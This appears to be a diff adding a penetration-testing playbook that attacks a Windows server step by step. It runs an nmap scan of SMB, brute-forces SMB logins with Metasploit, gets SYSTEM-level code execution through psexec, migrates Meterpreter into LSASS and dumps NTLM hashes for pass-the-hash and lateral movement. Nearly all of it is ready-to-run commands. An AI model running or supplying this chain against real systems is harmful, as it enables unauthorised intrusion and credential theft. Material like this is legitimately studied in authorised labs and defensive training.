@@ -1,0 +1,61 @@
+#########################################################
+# SMB Login + Privilege Escalation using Metasploit     #
+#########################################################
+
+-----------------------------------------
+1. Scan Windows Server for SMB & OS Info
+-----------------------------------------
+nmap -sV -O -p 445 <TARGET_IP>
+# SMB service confirmed running → move to credential attack
+
+-----------------------------------------
+2. Start Metasploit Framework (msf)
+-----------------------------------------
+msfconsole
+
+-----------------------------------------
+3. SMB Login Brute-Force using smb_login
+-----------------------------------------
+use auxiliary/scanner/smb/smb_login
+show options
+set USER_FILE users.txt           # users from WinPEAS output
+set PASS_FILE passwords.txt
+set RHOSTS <TARGET_IP>
+set VERBOSE false
+run
+# Valid credentials discovered, including Administrator accounts
+
+-----------------------------------------
+4. Achieve Remote Code Execution using psexec
+-----------------------------------------
+use exploit/windows/smb/psexec
+show options
+set RHOSTS <TARGET_IP>
+set SMBUser <ADMIN_USERNAME>
+set SMBPass <ADMIN_PASSWORD>
+run
+# Meterpreter session obtained
+
+-----------------------------------------
+5. Verify Privilege on Target (Win Server)
+-----------------------------------------
+getuid
+# Output: NT AUTHORITY\SYSTEM → high-privileged shell
+
+sysinfo
+# Shows OS version and architecture (Windows x86 displayed)
+
+-----------------------------------------
+6. Migrate to 64-bit Process to Enable Credential Dumping
+-----------------------------------------
+pgrep lsass
+# Note LSASS PID
+
+migrate <LSASS_PID>
+# Migrates Meterpreter into 64-bit LSASS → enables hash extraction
+
+-----------------------------------------
+7. Extract User Credential Hashes (Dump)
+-----------------------------------------
+hashdump
+# Saved NTLM hashes for lateral movement / pass-the-hash
